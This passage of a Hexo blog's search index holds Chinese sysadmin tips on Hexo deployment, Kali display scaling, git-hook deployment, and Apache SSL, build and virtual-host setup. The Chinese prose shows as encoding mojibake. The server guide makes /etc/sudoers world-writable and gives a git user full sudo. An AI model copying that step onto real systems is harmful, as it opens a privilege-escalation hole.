class="language-bash">hexo s <span class="token comment">#localhost:4000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>éƒ¨ç½²å‘½ä»¤</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git <span class="token parameter variable">--save</span> <span class="token comment">#å®‰è£…éƒ¨ç½²</span>hexo clean <span class="token comment">#æ¸…ç†ç¼“å­˜ï¼Œé‡åˆ°é—®é¢˜ä¸€å®šè¦å…ˆæ‰§è¡Œ</span>hexo g <span class="token comment">#æœ¬åœ°ç”Ÿæˆ</span>hexo d <span class="token comment">#éƒ¨ç½²åˆ°æœåŠ¡å™¨(github)</span>hexo n <span class="token comment">#åˆ›å»ºä¸€ä¸ªåšå®¢</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ä¿®æ”¹é…ç½®æ–‡ä»¶"><a href="#ä¿®æ”¹é…ç½®æ–‡ä»¶" class="headerlink" title="ä¿®æ”¹é…ç½®æ–‡ä»¶"></a>ä¿®æ”¹é…ç½®æ–‡ä»¶</h2><p>ä¸»ç›®å½•ä¸‹çš„<code>.config.yml</code>å°±æ˜¯é…ç½®æ–‡ä»¶</p><p>æ‰¾åˆ°deployæ·»åŠ å¦‚ä¸‹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">deploy:- type: <span class="token function">git</span>  repository: git@github.com:ç”¨æˆ·å/ç”¨æˆ·å.github.io.git  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>siteæ˜¯ç½‘ç«™æ˜¾ç¤ºå†…å®¹ï¼Œè‡ªè¡Œæ›´æ”¹</p><p>æ›´æ”¹ä¸»é¢˜</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">themeï¼š ä¸»é¢˜å<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="ä¸»é¢˜ä¸‹è½½"><a href="#ä¸»é¢˜ä¸‹è½½" class="headerlink" title="ä¸»é¢˜ä¸‹è½½"></a>ä¸»é¢˜ä¸‹è½½</h2><p><a href="https://hexo.io/themes/">Themes | Hexo</a>é€‰æ‹©ä¸€ä¸ªä¸»é¢˜ï¼Œè¿›å…¥themeç›®å½•<code>git clone ä¸»é¢˜é“¾æ¥</code></p><p>å†æ ¹æ®ä¸»é¢˜çš„readmeä¿®æ”¹ç½‘ç«™é…ç½®ï¼Œä¸»é¢˜çš„é…ç½®æ–‡ä»¶ä¸»é¢˜ç›®å½•ä¸‹<code>.config.yml</code></p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è§£å†³kaliå­—ä½“å¤ªå°</title>
      <link href="/2021/08/13/jie-jue-kali-zi-ti-tai-xiao/"/>
      <url>/2021/08/13/jie-jue-kali-zi-ti-tai-xiao/</url>
      
        <content type="html"><![CDATA[<h1 id="è§£å†³kaliå­—ä½“å¤ªå°"><a href="#è§£å†³kaliå­—ä½“å¤ªå°" class="headerlink" title="è§£å†³kaliå­—ä½“å¤ªå°"></a>è§£å†³kaliå­—ä½“å¤ªå°</h1><p>æ¡Œé¢å³é”®-&gt;åº”ç”¨ç¨‹åº-&gt;è®¾ç½®-&gt;å¤–è§‚-&gt;è®¾ç½®-&gt; çª—å£ç¼©æ”¾x2</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token builtin class-name">export</span> <span class="token assign-left variable">GDK_SCALE</span><span class="token operator">=</span><span class="token number">2</span> <span class="token operator">&gt;&gt;</span> ~/.xsessionrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¼ºåˆ¶å…‰æ ‡å˜å¤§</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token builtin class-name">export</span> <span class="token assign-left variable">XCURSOR_SIZE</span><span class="token operator">=</span><span class="token number">48</span> <span class="token operator">&gt;&gt;</span> ~/.xsessionrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¡Œé¢å³é”®-&gt;åº”ç”¨ç¨‹åº-&gt;è®¾ç½®-&gt;å¤–è§‚-&gt;å­—ä½“-&gt;DPI=180   è°ƒå­—ä½“å¤§å°</p><p>ä»¥ä¸Šå¦‚æœä¸æˆåŠŸ</p><p>å·¦ä¸Šè§’æœç´¢<code>Kali HiDPI Mode</code>ç‚¹å‡»ä¸€ä¸‹å³å¯åˆ‡æ¢ç¼©æ”¾</p><p>å¤šå°è¯•ï¼Œç»“åˆä¸åŒçš„ç‚¹è°ƒè¯•</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°†hexoéƒ¨ç½²åˆ°æœåŠ¡å™¨</title>
      <link href="/2021/08/12/jiang-hexo-bu-shu-dao-fu-wu-qi/"/>
      <url>/2021/08/12/jiang-hexo-bu-shu-dao-fu-wu-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="å°†hexoéƒ¨ç½²åˆ°æœåŠ¡å™¨"><a href="#å°†hexoéƒ¨ç½²åˆ°æœåŠ¡å™¨" class="headerlink" title="å°†hexoéƒ¨ç½²åˆ°æœåŠ¡å™¨"></a>å°†hexoéƒ¨ç½²åˆ°æœåŠ¡å™¨</h1><p>æˆ‘ä»¥å‰æ˜¯éƒ¨ç½²åœ¨githubä¸Šçš„ï¼Œæœ¬æœºçš„éƒ¨ç½²éƒ½æ˜¯å®Œæˆäº†çš„ï¼Œæœ¬æœºéƒ¨ç½²è¯·çœ‹å…¶ä»–æ•™ç¨‹</p><h2 id="å®‰è£…git"><a href="#å®‰è£…git" class="headerlink" title="å®‰è£…git"></a>å®‰è£…git</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> <span class="token function">git</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="åˆ›å»ºgitç”¨æˆ·"><a href="#åˆ›å»ºgitç”¨æˆ·" class="headerlink" title="åˆ›å»ºgitç”¨æˆ·"></a>åˆ›å»ºgitç”¨æˆ·</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adduser <span class="token function">git</span> <span class="token comment">#/home ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªgitç›®å½•</span><span class="token function">passwd</span> <span class="token function">git</span> <span class="token comment">#è®¾ç½®å¯†ç </span><span class="token function">chmod</span> a+w /etc/sudoers<span class="token function">vim</span> /etc/sudoers <span class="token comment">#æ·»åŠ git ALL=(ALL) ALL</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é…ç½®SSHå¯†é’¥"><a href="#é…ç½®SSHå¯†é’¥" class="headerlink" title="é…ç½®SSHå¯†é’¥"></a>é…ç½®SSHå¯†é’¥</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> ~/.ssh/authorized_keys<span class="token comment">#åœ¨ç‰©ç†æœºä¸­å¤åˆ¶C:\Users\youruser\.ssh\id_rsa.pubä¸­çš„å…¬é’¥åˆ°ä¸Šé¢çš„æ–‡ä»¶ä¸­</span>ä¿å­˜é€€å‡º<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="åˆ›å»ºä»“åº“"><a href="#åˆ›å»ºä»“åº“" class="headerlink" title="åˆ›å»ºä»“åº“"></a>åˆ›å»ºä»“åº“</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> <span class="token function">git</span><span class="token builtin class-name">cd</span> /home/git<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> projects/hexo <span class="token comment"># å»ºç«‹é¡¹ç›®ç›®å½•</span><span class="token function">mkdir</span> repos <span class="token comment">#åˆ›å»ºä»“åº“ç›®å½•</span><span class="token builtin class-name">cd</span> repos<span class="token function">git</span> init <span class="token parameter variable">--bare</span> hexo.git <span class="token comment">#åˆ›å»ºä»“åº“</span><span class="token function">chown</span> <span class="token parameter variable">-R</span> git:git /home/git/repos/hexo.git <span class="token comment"># ç»™gitç”¨æˆ·æ·»åŠ æƒé™</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="åˆ›å»ºä¸€ä¸ªé’©å­"><a href="#åˆ›å»ºä¸€ä¸ªé’©å­" class="headerlink" title="åˆ›å»ºä¸€ä¸ªé’©å­"></a>åˆ›å»ºä¸€ä¸ªé’©å­</h2><p>æ¥ä¸Šé¢ç»§ç»­æ“ä½œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> hexo.git/hooks<span class="token function">vim</span> post-receive <span class="token comment"># åˆ›å»ºä¸€ä¸ªé’©å­</span><span class="token comment">#æ·»åŠ å¦‚ä¸‹æ–‡ä»¶</span><span class="token comment">#!/bin/sh</span><span class="token function">git</span> --work-tree<span class="token operator">=</span>/var/www/blog --git-dir<span class="token operator">=</span>/home/git/repos/hexo.git checkout <span class="token parameter variable">-f</span><span class="token function">chmod</span> +x post-receive <span class="token comment"># æ·»åŠ å¯æ‰§è¡Œæƒé™</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æœ¬åœ°å»ºç«‹SSHä¿¡ä»»å…³ç³»"><a href="#æœ¬åœ°å»ºç«‹SSHä¿¡ä»»å…³ç³»" class="headerlink" title="æœ¬åœ°å»ºç«‹SSHä¿¡ä»»å…³ç³»"></a>æœ¬åœ°å»ºç«‹SSHä¿¡ä»»å…³ç³»</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-copy-id <span class="token parameter variable">-i</span> ~/.ssh/id_rsa.pub git@server_ip <span class="token comment"># å»ºç«‹ä¿¡ä»»å…³ç³»</span><span class="token function">ssh</span> git@server_ip <span class="token comment"># è¯•ä¸€ä¸‹èƒ½ä¸èƒ½ç™»å½•</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="æ›´æ”¹gitç”¨æˆ·é»˜è®¤çš„shell"><a href="#æ›´æ”¹gitç”¨æˆ·é»˜è®¤çš„shell" class="headerlink" title="æ›´æ”¹gitç”¨æˆ·é»˜è®¤çš„shell"></a>æ›´æ”¹gitç”¨æˆ·é»˜è®¤çš„shell</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/shells <span class="token comment"># æŸ¥çœ‹ git-shell æ˜¯å¦åœ¨ç™»å½•æ–¹å¼é‡Œé¢</span><span class="token function">which</span> git-shell <span class="token comment"># æ‰¾åˆ°git-shellçš„è·¯å¾„ï¼Œè®°ä¸‹æ¥</span><span class="token function">vim</span> /etc/shellsç„¶åæŠŠåˆšæ‰è®°ä¸‹æ¥çš„è·¯å¾„æ·»åŠ è¿›å»<span class="token function">vim</span> /etc/passwd<span class="token comment">#æŠŠgit:x:1000:1000::/home/git:/bin/bashä¿®æ”¹ä¸ºgit:x:1000:1000:,,,:/home/git:/usr/bin/git-shell</span><span class="token comment">#æ²¡æœ‰å°±ç®—äº†</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h2><p>æŠ¥é”™<code>remote: fatal: cannot create directory at '2019': Permission denied</code></p><p>éƒ¨ç½²ç›®å½•æ²¡æœ‰å†™çš„æƒé™ï¼Œæ”¹æ³•</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> go+w /home/git/projects/hexo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>apacheéƒ¨ç½²ssl</title>
      <link href="/2021/08/11/apache-bu-shu-ssl/"/>
      <url>/2021/08/11/apache-bu-shu-ssl/</url>
      
        <content type="html"><![CDATA[<h1 id="apacheéƒ¨ç½²ssl"><a href="#apacheéƒ¨ç½²ssl" class="headerlink" title="apacheéƒ¨ç½²ssl"></a>apacheéƒ¨ç½²ssl</h1><h2 id="å¼€å¯mod-sslæ¨¡å—"><a href="#å¼€å¯mod-sslæ¨¡å—" class="headerlink" title="å¼€å¯mod_sslæ¨¡å—"></a>å¼€å¯mod_sslæ¨¡å—</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">LoadModule socache_shmcb_module modules/mod_socache_shmcb.soLoadModule ssl_module modules/mod_ssl.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="åŠ è½½é…ç½®æ–‡ä»¶"><a href="#åŠ è½½é…ç½®æ–‡ä»¶" class="headerlink" title="åŠ è½½é…ç½®æ–‡ä»¶"></a>åŠ è½½é…ç½®æ–‡ä»¶</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">includeOptionalconf.d/*.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="ä¿å­˜è¯ä¹¦"><a href="#ä¿å­˜è¯ä¹¦" class="headerlink" title="ä¿å­˜è¯ä¹¦"></a>ä¿å­˜è¯ä¹¦</h2><p>åœ¨apacheå®‰è£…ç›®å½•ä¸­æ–°å»ºcertç›®å½•ï¼Œå°†è¯ä¹¦è§£å‹è‡³æ­¤</p><h2 id="ä¿®æ”¹ssl-confé…ç½®æ–‡ä»¶"><a href="#ä¿®æ”¹ssl-confé…ç½®æ–‡ä»¶" class="headerlink" title="ä¿®æ”¹ssl.confé…ç½®æ–‡ä»¶"></a>ä¿®æ”¹ssl.confé…ç½®æ–‡ä»¶</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>VirtualHost *:44<span class="token operator"><span class="token file-descriptor important">3</span>&gt;</span>         ServerName   <span class="token comment">#ä¿®æ”¹ä¸ºç”³è¯·è¯ä¹¦æ—¶ç»‘å®šçš„åŸŸåwww.YourDomainName1.comã€‚                    </span>    DocumentRoot  /data/www/hbappserver/public              SSLEngine on       SSLProtocol all <span class="token parameter variable">-SSLv2</span> <span class="token parameter variable">-SSLv3</span> <span class="token comment"># æ·»åŠ SSLåè®®æ”¯æŒåè®®ï¼Œå»æ‰ä¸å®‰å…¨çš„åè®®ã€‚</span>    SSLCipherSuite HIGH:<span class="token operator">!</span>RC4:<span class="token operator">!</span>MD5:<span class="token operator">!</span>aNULL:<span class="token operator">!</span>eNULL:<span class="token operator">!</span>NULL:<span class="token operator">!</span>DH:<span class="token operator">!</span>EDH:<span class="token operator">!</span>EXP:+MEDIUM   <span class="token comment"># ä¿®æ”¹åŠ å¯†å¥—ä»¶ã€‚</span>    SSLHonorCipherOrder on    SSLCertificateFile cert/domain name1_public.crt   <span class="token comment"># å°†domain name1_public.crtæ›¿æ¢æˆæ‚¨è¯ä¹¦æ–‡ä»¶åã€‚</span>    SSLCertificateKeyFile cert/domain name1.key   <span class="token comment"># å°†domain name1.keyæ›¿æ¢æˆæ‚¨è¯ä¹¦çš„å¯†é’¥æ–‡ä»¶åã€‚</span>    SSLCertificateChainFile cert/domain name1_chain.crt  <span class="token comment"># å°†domain name1_chain.crtæ›¿æ¢æˆæ‚¨è¯ä¹¦çš„å¯†é’¥æ–‡ä»¶åï¼›è¯ä¹¦é“¾å¼€å¤´å¦‚æœæœ‰#å­—ç¬¦ï¼Œè¯·åˆ é™¤ã€‚</span><span class="token operator">&lt;</span>/VirtualHost<span class="token operator">&gt;</span><span class="token comment">#å¦‚æœè¯ä¹¦åŒ…å«å¤šä¸ªåŸŸåï¼Œå¤åˆ¶ä»¥ä¸Šå‚æ•°ï¼Œå¹¶å°†ServerNameæ›¿æ¢æˆç¬¬äºŒä¸ªåŸŸåã€‚ </span><span class="token operator">&lt;</span>VirtualHost *:44<span class="token operator"><span class="token file-descriptor important">3</span>&gt;</span>         ServerName   <span class="token comment">#ä¿®æ”¹ä¸ºç”³è¯·è¯ä¹¦æ—¶ç»‘å®šçš„ç¬¬äºŒä¸ªåŸŸåwww.YourDomainName2.comã€‚                    </span>    DocumentRoot  /data/www/hbappserver/public              SSLEngine on       SSLProtocol all <span class="token parameter variable">-SSLv2</span> <span class="token parameter variable">-SSLv3</span> <span class="token comment"># æ·»åŠ SSLåè®®æ”¯æŒåè®®ï¼Œå»æ‰ä¸å®‰å…¨çš„åè®®ã€‚</span>    SSLCipherSuite HIGH:<span class="token operator">!</span>RC4:<span class="token operator">!</span>MD5:<span class="token operator">!</span>aNULL:<span class="token operator">!</span>eNULL:<span class="token operator">!</span>NULL:<span class="token operator">!</span>DH:<span class="token operator">!</span>EDH:<span class="token operator">!</span>EXP:+MEDIUM   <span class="token comment"># ä¿®æ”¹åŠ å¯†å¥—ä»¶ã€‚</span>    SSLHonorCipherOrder on    SSLCertificateFile cert/domain name2_public.crt   <span class="token comment"># å°†domain name2æ›¿æ¢æˆæ‚¨ç”³è¯·è¯ä¹¦æ—¶çš„ç¬¬äºŒä¸ªåŸŸåã€‚</span>    SSLCertificateKeyFile cert/domain name2.key   <span class="token comment"># å°†domain name2æ›¿æ¢æˆæ‚¨ç”³è¯·è¯ä¹¦æ—¶çš„ç¬¬äºŒä¸ªåŸŸåã€‚</span>    SSLCertificateChainFile cert/domain name2_chain.crt  <span class="token comment"># å°†domain name2æ›¿æ¢æˆæ‚¨ç”³è¯·è¯ä¹¦æ—¶çš„ç¬¬äºŒä¸ªåŸŸåï¼›è¯ä¹¦é“¾å¼€å¤´å¦‚æœæœ‰#å­—ç¬¦ï¼Œè¯·åˆ é™¤ã€‚</span><span class="token operator">&lt;</span>/VirtualHost<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é‡å¯ç”Ÿæ•ˆ"><a href="#é‡å¯ç”Ÿæ•ˆ" class="headerlink" title="é‡å¯ç”Ÿæ•ˆ"></a>é‡å¯ç”Ÿæ•ˆ</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> httpd restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="HTTPè¯·æ±‚è‡ªåŠ¨è·³è½¬HTTPS"><a href="#HTTPè¯·æ±‚è‡ªåŠ¨è·³è½¬HTTPS" class="headerlink" title="HTTPè¯·æ±‚è‡ªåŠ¨è·³è½¬HTTPS"></a>HTTPè¯·æ±‚è‡ªåŠ¨è·³è½¬HTTPS</h2><p>httpd.confæ–‡ä»¶ä¸­çš„<code>&lt;VirtualHost *:80&gt; &lt;/VirtualHost&gt;</code>ä¸­é—´ï¼Œæ·»åŠ ä»¥ä¸‹é‡å®šå‘ä»£ç ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">RewriteEngine onRewriteCond %<span class="token punctuation">{</span>SERVER_PORT<span class="token punctuation">}</span> <span class="token operator">!</span>^443$RewriteRule ^<span class="token punctuation">(</span>.*<span class="token punctuation">)</span>$ https://%<span class="token punctuation">{</span>SERVER_NAME<span class="token punctuation">}</span><span class="token variable">$1</span> <span class="token punctuation">[</span>L,R<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apacheå®‰è£…</title>
      <link href="/2021/08/11/apache-an-zhuang/"/>
      <url>/2021/08/11/apache-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="Apacheå®‰è£…"><a href="#Apacheå®‰è£…" class="headerlink" title="Apacheå®‰è£…"></a>Apacheå®‰è£…</h1><p>é¦–å…ˆå®‰è£…aprï¼Œapr-utilï¼Œapr-iconvï¼Œprceï¼Œè¿™å‡ ä¸ªä¾èµ–åŒ…èƒ½æé«˜ç”Ÿäº§åŠ›</p><h2 id="apr"><a href="#apr" class="headerlink" title="apr"></a>apr</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://downloads.apache.org//apr/apr-1.7.0.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> apr-1.7.0.tar.gz<span class="token builtin class-name">cd</span> apr-1.7.0./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/apr<span class="token function">make</span> <span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="apr-util"><a href="#apr-util" class="headerlink" title="apr-util"></a>apr-util</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://downloads.apache.org/apr/apr-util-1.6.1.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> apr-util-1.6.1.tar.gz<span class="token builtin class-name">cd</span> apr-util-1.6.1./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/apr-util --with-apr<span class="token operator">=</span>/usr/local/apr<span class="token function">make</span> <span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="apr-iconv"><a href="#apr-iconv" class="headerlink" title="apr-iconv"></a>apr-iconv</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://downloads.apache.org/apr/apr-iconv-1.2.2.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> apr-iconv-1.2.2.tar.gz<span class="token builtin class-name">cd</span> apr-iconv-1.2.2./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/apr-iconv --with-apr<span class="token operator">=</span>/usr/local/apr<span class="token function">make</span> <span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="prce"><a href="#prce" class="headerlink" title="prce"></a>prce</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://sourceforge.net/projects/pcre/files/pcre/8.44/pcre-8.44.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> pcre-8.44.tar.gz<span class="token builtin class-name">cd</span> pcre-8.44./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/pcre<span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://apache.mirror.digitalpacific.com.au//httpd/httpd-2.4.48.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> httpd-2.4.48.tar.gz<span class="token builtin class-name">cd</span> httpd-2.4.48./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/httpd --with-apr<span class="token operator">=</span>/usr/local/apr/apr --with-apr-util<span class="token operator">=</span>/usr/local/apr/util --with-pcre<span class="token operator">=</span>/usr/local/pcre<span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é˜¿é‡Œäº‘éƒ¨ç½²apacheäºŒçº§åŸŸå</title>
      <link href="/2021/08/10/a-li-yun-bu-shu-apache-er-ji-yu-ming/"/>
      <url>/2021/08/10/a-li-yun-bu-shu-apache-er-ji-yu-ming/</url>
      
        <content type="html"><![CDATA[<h1 id="é˜¿é‡Œäº‘éƒ¨ç½²apacheäºŒçº§åŸŸå"><a href="#é˜¿é‡Œäº‘éƒ¨ç½²apacheäºŒçº§åŸŸå" class="headerlink" title="é˜¿é‡Œäº‘éƒ¨ç½²apacheäºŒçº§åŸŸå"></a>é˜¿é‡Œäº‘éƒ¨ç½²apacheäºŒçº§åŸŸå</h1><h2 id="æ·»åŠ DNSè§£æè®°å½•"><a href="#æ·»åŠ DNSè§£æè®°å½•" class="headerlink" title="æ·»åŠ DNSè§£æè®°å½•"></a>æ·»åŠ DNSè§£æè®°å½•</h2><p>åˆ°é˜¿é‡Œäº‘æ§åˆ¶å°-&gt;äº‘è§£æDNS-&gt;åŸŸåè§£æ-&gt;è§£æè®¾ç½®-&gt;æ·»åŠ è®°å½•</p><p>ä¸»æœºè®°å½•å°±æ˜¯ä½ çš„äºŒçº§åŸŸå</p><p>è®°å½•ç±»å‹ä¸ºAâ€”â€”æŒ‡å‘IPV4</p><p>è§£æè·¯çº¿é»˜è®¤</p><p>è®°å½•å€¼ä¸ºä½ çš„å¤–ç½‘IP</p><h2 id="é…ç½®Apache"><a href="#é…ç½®Apache" class="headerlink" title="é…ç½®Apache"></a>é…ç½®Apache</h2><p>ç¼–è¾‘<code>httpd.conf</code></p><p>æ³¨é‡Šæ‰è™šæ‹Ÿç›®å½•å¤–çš„<code>DocumentRoot</code></p><p>æ·»åŠ </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">NameVirtualHost *:80<span class="token operator">&lt;</span>VirtualHost *:8<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>ServerAdmin root@localhostDocumentRoot <span class="token string">"/var/www/your1"</span>ServerName two1.yourname<span class="token operator">&lt;</span>Directory <span class="token string">"/var/www/your1"</span><span class="token operator">&gt;</span>Options Indexes FollowSymLinksAllowOverride NoneRequire all granted<span class="token operator">&lt;</span>/Directory<span class="token operator">&gt;</span><span class="token operator">&lt;</span>/VirtualHost<span class="token operator">&gt;</span><span class="token operator">&lt;</span>VirtualHost *:8<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>ServerAdmin root@localhostDocumentRoot <span class="token string">"/var/www/your2"</span>ServerName two2.yourname<span class="token operator">&lt;</span>Directory <span class="token string">"/var/www/your2"</span><span class="token operator">&gt;</span>Options Indexes FollowSymLinksAllowOverride NoneRequire all granted<span class="token operator">&lt;</span>/Directory<span class="token operator">&gt;</span><span class="token operator">&lt;</span>/VirtualHost<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é‡å¯"><a href="#é‡å¯" class="headerlink" title="é‡å¯"></a>é‡å¯</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> httpd restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxå®‰è£…è½¯ä»¶åŒ…</title>
      <link href="/2021/08/02/linux-an-zhuang-ruan-jian-bao/"/>
      <url>/2021/08/02/linux-an-zhuang-ruan-jian-bao/</url>
      
